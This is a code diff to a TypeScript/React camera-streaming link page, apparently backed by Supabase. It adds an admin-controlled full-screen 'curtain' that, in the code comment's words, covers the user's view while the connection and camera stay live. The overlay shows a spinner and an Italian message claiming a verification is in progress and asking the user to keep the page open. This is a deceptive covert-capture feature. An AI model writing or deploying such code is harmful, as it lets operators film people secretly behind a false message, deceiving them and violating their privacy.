@@ -24,6 +24,8 @@ interface LinkConfig {
   backQuality: QualityProfile;
   frontQuality: QualityProfile;
   session_status: SessionStatus;
+  user_view_hidden: boolean;
+
 }
 
 type LoadState =
@@ -42,8 +44,10 @@ function LinkPage() {
   const { linkId } = Route.useParams();
   const [load, setLoad] = useState<LoadState>({ kind: "loading" });
   const [sessionStatus, setSessionStatus] = useState<SessionStatus>("idle");
+  const [userViewHidden, setUserViewHidden] = useState(false);
   const [, setStatusSource] = useState<StatusSource>("init");
   const [, setRtStatus] = useState<string>("connecting");
+
 
   useEffect(() => {
     let cancelled = false;
@@ -51,7 +55,7 @@ function LinkPage() {
       const { data, error } = await supabase
         .from("links")
         .select(
-          "label, pad_code, camera_mode, back_definition_id, back_framerate_id, back_bitrate_id, front_definition_id, front_framerate_id, front_bitrate_id, session_status",
+          "label, pad_code, camera_mode, back_definition_id, back_framerate_id, back_bitrate_id, front_definition_id, front_framerate_id, front_bitrate_id, session_status, user_view_hidden",
         )
         .eq("id", linkId)
         .maybeSingle();
@@ -79,10 +83,13 @@ function LinkPage() {
           bitrateId: data.front_bitrate_id ?? 8,
         },
         session_status: ((data as any).session_status as SessionStatus) ?? "idle",
+        user_view_hidden: Boolean((data as any).user_view_hidden),
       };
       setLoad({ kind: "ready", config: cfg });
       setSessionStatus(cfg.session_status);
+      setUserViewHidden(cfg.user_view_hidden);
       setStatusSource("init");
+
     })();
     return () => {
       cancelled = true;
@@ -97,12 +104,17 @@ function LinkPage() {
         "postgres_changes",
         { event: "UPDATE", schema: "public", table: "links", filter },
         (payload) => {
-          const next = (payload.new as any)?.session_status as SessionStatus | undefined;
+          const n = payload.new as any;
+          const next = n?.session_status as SessionStatus | undefined;
           if (next) {
             setSessionStatus(next);
             setStatusSource("realtime");
           }
+          if (typeof n?.user_view_hidden === "boolean") {
+            setUserViewHidden(n.user_view_hidden);
+          }
         },
+
       )
       .subscribe((status) => {
         setRtStatus(String(status).toLowerCase());
@@ -167,6 +179,7 @@ function LinkPage() {
       linkId={linkId}
       config={load.config}
       sessionStatus={sessionStatus}
+      userViewHidden={userViewHidden}
     />
   );
 }
@@ -175,11 +188,14 @@ function LiveLink({
   linkId,
   config,
   sessionStatus,
+  userViewHidden,
 }: {
   linkId: string;
   config: LinkConfig;
   sessionStatus: SessionStatus;
+  userViewHidden: boolean;
 }) {
+
   const initialRequired: "back" | "front" =
     config.camera_mode === "locked_front" ? "front" :
     config.camera_mode === "locked_back" ? "back" :
@@ -521,10 +537,25 @@ function LiveLink({
         </div>
       )}
 
+      {/* Admin-controlled curtain — covers user's view while connection & camera stay live */}
+      {userViewHidden && (
+        <div className="fixed inset-0 z-[60] flex flex-col items-center justify-center gap-6 bg-gradient-to-b from-background to-muted/30 px-6 text-center text-foreground">
+          <BrandHeader />
+          <div className="flex flex-col items-center gap-4">
+            <span className="inline-block h-10 w-10 animate-spin rounded-full border-4 border-muted border-t-primary" />
+            <p className="text-lg font-medium">Attendere prego…</p>
+            <p className="max-w-xs text-sm text-muted-foreground">
+              Verifica in corso. Mantieni questa pagina aperta.
+            </p>
+          </div>
+        </div>
+      )}
+
       {/* Always-mounted playBtn for SDK gesture handoff */}
       <button id="playBtn" hidden className="hidden">
         Tocca per avviare
       </button>
+
     </>
   );
 }
